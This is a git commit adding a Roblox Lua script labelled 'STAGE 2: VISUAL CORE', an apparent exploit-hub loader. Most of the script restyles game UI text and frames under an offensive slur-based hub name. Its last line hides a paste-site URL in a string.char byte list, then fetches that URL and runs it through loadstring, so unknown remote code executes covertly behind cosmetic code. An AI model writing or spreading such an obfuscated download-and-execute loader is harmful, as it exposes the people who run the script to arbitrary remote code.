3d31325ba9e31410a100719f247348ecdf83cc66
nonamemansd <107858894+nonamemansd@users.noreply.github.com>
2026-02-03 11:42:18 +0200

    Upload Payload_fedb10a2.lua

---
+++ Payload_fedb10a2.lua
@@ -0,0 +1,35 @@
+
+--[[ STAGE 2: VISUAL CORE ]]
+local HubName = "Rudefags Hub"
+local Acc = Color3.fromRGB(0, 255, 120)
+
+-- // SMART HOOK //
+local function Hook()
+    local function Customize(obj)
+        pcall(function()
+            if obj:IsA("TextLabel") then
+                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
+                    if #obj.Text > 3 and not tonumber(obj.Text) then
+                        obj.Text = HubName
+                        obj.TextColor3 = Acc
+                    end
+                end
+            end
+            if obj:IsA("Frame") or obj:IsA("TextButton") then
+                if obj.BackgroundColor3.R < 0.2 then
+                    if not obj:FindFirstChild("UICorner") then
+                        local uic = Instance.new("UICorner")
+                        uic.CornerRadius = UDim.new(0, 6)
+                        uic.Parent = obj
+                    end
+                end
+            end
+        end)
+    end
+    game.DescendantAdded:Connect(function(c)
+        if c:IsA("GuiObject") then task.delay(0.1, function() Customize(c) end) end
+    end)
+end
+
+Hook()
+loadstring(game:HttpGet(string.char(104, 116, 116, 112, 115, 58, 47, 47, 112, 97, 115, 116, 101, 102, 121, 46, 97, 112, 112, 47, 85, 65, 87, 110, 78, 108, 69, 67, 47, 114, 97, 119)))()
